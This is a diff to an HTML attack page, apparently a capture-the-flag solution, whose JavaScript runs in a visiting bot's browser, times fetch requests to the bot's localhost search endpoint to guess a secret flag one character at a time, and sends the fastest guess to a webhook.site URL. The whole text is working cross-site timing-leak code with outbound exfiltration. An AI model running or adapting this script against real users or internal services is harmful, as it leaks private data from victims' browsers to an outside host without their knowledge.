@@ -3,7 +3,7 @@
 <body>
 <script>
 // 1. Replace this with your webhook.site URL
-const webhook = "https://webhook.site/e0bf8668-2c8b-438e-abe5-667b3232ed9c";
+const webhook = "https://webhook.site/YOUR_UNIQUE_ID_HERE";
 
 // The bot is attacking its own local server
 const target = "http://localhost:5000/search?flag=";
@@ -11,33 +11,42 @@ const target = "http://localhost:5000/search?flag=";
 // The characters allowed in the flag format
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}".split("");
 
-// We know the flag starts with this
+// Start with the known prefix
 let known = "PUCTF26{"; 
 
 async function measure(guess) {
     const start = performance.now();
     try {
-        // Send the guess to the local server
         await fetch(target + guess, { mode: 'no-cors', cache: 'no-store' });
     } catch(e) {}
-    // Return how long it took in milliseconds
     return performance.now() - start;
 }
 
-async function leak() {
+async function leakNextCharacter() {
+    let bestChar = '';
+    let lowestTime = Infinity;
+
+    // Loop through every possible character
     for (let char of charset) {
         let guess = known + char;
         let time = await measure(guess);
         
-        // Send the guess and the time it took back to your webhook
-        fetch(`${webhook}?guess=${guess}&time=${time}`, {mode: 'no-cors'});
+        // If this character was faster than our current record, update it!
+        if (time < lowestTime) {
+            lowestTime = time;
+            bestChar = char;
+        }
         
-        // A tiny delay so we don't crash the bot's browser
-        await new Promise(r => setTimeout(r, 100));
+        // A tiny delay to keep the network requests stable
+        await new Promise(r => setTimeout(r, 50));
     }
+
+    // After checking all characters, send ONLY the winner to your webhook
+    let updatedFlag = known + bestChar;
+    fetch(`${webhook}?winner=${bestChar}&new_known=${updatedFlag}&time=${lowestTime}`, {mode: 'no-cors'});
 }
 
-leak();
+leakNextCharacter();
 </script>
 </body>
 </html>
